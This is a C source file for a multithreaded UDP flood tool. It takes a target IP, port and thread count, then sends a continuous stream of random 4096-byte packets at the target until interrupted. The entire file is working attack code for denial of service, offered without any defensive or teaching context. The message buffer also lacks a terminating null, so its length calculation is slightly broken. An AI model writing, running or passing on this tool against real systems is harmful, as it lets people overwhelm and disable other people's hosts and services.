#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <stdatomic.h>
#include <signal.h>

#define MESSAGE_SIZE 4096

int client_fd;
int target_port;
char message[MESSAGE_SIZE];
atomic_bool thread_stop = false;

void *flood(void *argv)
{
    while (!atomic_load(&thread_stop))
    {
        send(client_fd, message, strlen(message), 0);
    }
    return NULL;
}

void sigint_handler(int sig)
{
    atomic_store(&thread_stop, true);
    printf("\nStopping program\n");
}

int main(int argc, char const *argv[])
{
    signal(SIGINT, sigint_handler);
    if (argc < 4)
    {
        printf("Usage: udpflood <target-ip> <target-port> <thread-count>\n");
        return 1;
    }
    target_port = atoi(argv[2]);
    int thread_count = atoi(argv[3]);
    if (thread_count < 1)
    {
        printf("Thread count cannot be smaller than 1\n");
        return 1;
    }
    printf("Target ip: %s\n", argv[1]);
    printf("Target port: %d\n", target_port);
    printf("Thread count: %d\n", thread_count);

    pthread_t thread_array[thread_count];

    struct sockaddr_in target_addr;

    if ((client_fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
    {
        printf("\n Socket creation error \n");
        return -1;
    }

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);

    // Convert IPv4 and IPv6 addresses from text to binary
    // form
    if (inet_pton(AF_INET, argv[1], &target_addr.sin_addr) <= 0)
    {
        printf(
            "\nInvalid address/ Address not supported \n");
        return -1;
    }

    if (connect(client_fd, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0)
    {
        printf("\nConnection Failed \n");
        return -1;
    }

    for (int i = 0; i < MESSAGE_SIZE; i++)
    {
        message[i] = (char)((rand() % 95) + 32);
    }

    for (int i = 0; i < thread_count; i++)
    {
        pthread_create(&thread_array[i], NULL, flood, NULL);
    }
    for (int i = 0; i < thread_count; i++)
    {
        pthread_join(thread_array[i], NULL);
    }
    close(client_fd);

    return 0;
}